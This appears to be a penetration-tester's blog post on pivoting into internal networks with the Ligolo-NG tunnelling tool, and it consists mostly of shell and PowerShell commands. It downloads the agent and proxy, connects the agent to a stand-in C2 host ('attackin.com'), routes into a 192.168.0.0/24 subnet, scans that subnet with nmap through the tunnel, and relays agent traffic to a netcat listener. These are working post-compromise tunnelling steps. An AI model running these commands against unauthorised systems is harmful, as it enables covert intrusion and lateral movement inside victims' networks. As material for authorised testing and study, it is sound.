---
layout: '../../layouts/Post.astro'
title: 'Pivoting Methodology'
image: '/images/pivot1'
# image: 'https://22863376c5.clvaw-cdnwnd.com/2c46b638ae8400165ec727f2390cd862/200000109-4dacc4dacf/0_0k6y3ytGb8Fjtrnr.webp?ph=22863376c5'
publishedAt: "2023-10-3"
category: 'Hybrid'
---

## Overview


### Tools

#### Ligolo-NG
Repo: https://github.com/nicocha30/ligolo-ng/
Guides: https://youtu.be/DM1B8S80EvQ
        https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
Reqs: Requires Go 1.20

##### Linux Setup
##### Set-Up Tun Interface for Proxy
```bash
user=mellonaut
# linux agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && rm ligolo-ng_agent_0.4.4_linux_amd64.tar.gz

# windows agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip ligolo-ng_agent_0.4.4_windows_amd64.zip && rm ligolo-ng_agent_0.4.4_windows_amd64.zip


# proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && rm ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz

sudo ip tuntap add user $user mode tun ligolo
sudo ip link set ligolo up
```

##### Linux Start Proxy
```bash
./proxy -h # Help options
./proxy -autocert # Automatically request LetsEncrypt certificates
```

##### TLS - No LetsEncrypt
```bash
cert=/home/$user/cert.pem
key=/home/$user/cert.pem

./proxy -certfile $cert -keyfile $key
# ./proxy -selfcert # must use -ignore-cert on the agent side
```

##### Windows Setup
##### Proxy Requires Win-Tun .dll from Wireguard project
```powershell
Invoke-WebRequest -Uri https://www.wintun.net/builds/wintun-0.14.1.zip -OutFile wintun-0.14.1.zip; Expand-Archive -Path wintun-0.14.1.zip -DestinationPath .\; Remove-Item wintun-0.14.1.zip
Invoke-WebRequest -Uri https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_windows_amd64.zip -OutFile ligolo.zip; Expand-Archive -Path ligolo.zip -DestinationPath .\; Remove-Item ligolo.zip
Invoke-WebRequest -Uri https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip -OutFile agent.zip; Expand-Archive -Path agent.zip -DestinationPath .\; Remove-Item agent.zip
Copy-Item -Path .\wintun\bin\amd64\*.dll -Destination .\ligolo\
```



##### Agent Usage
```bash
c2=https://attackin.com
./agent -connect $c2:11601
```

##### Agent SOCKS5 
```bash
c2=https://attackin.com
./agent -connect --socks $c2:11601
# --socks-user --socks-pass
```

##### Interacting -  Linux - Add Route to Ligolo
```bash
ligolo-ng >> session
1
ifconfig # Agents IPv4 address/ Subnet shown 192.168.0.30/24
sudo ip route add 192.168.0.0/24 dev ligolo # tun device is ligolo
```

##### Interacting -  Windows - Add Route to Ligolo
```powershell
netsh int ipv4 show interfaces
route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

##### Access Network
From proxy server 
```bash
start # starts the tunnel
nmap 192.168.0.0/24 -v -sV -n --unprivileged # or -PE, use the tunnel, reduce false-positives if we're not admin
```

##### Add Listener to Agent, redirect all traffic from agent 1234 to C2 server 4321
Start a listener on the agent to redirect to the C2 server
```bash
# From Ligolo-ng session
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```

Start a netcat listener to recieve the traffic
```bash
# From Proxy
nc -lvp 4321
```

     

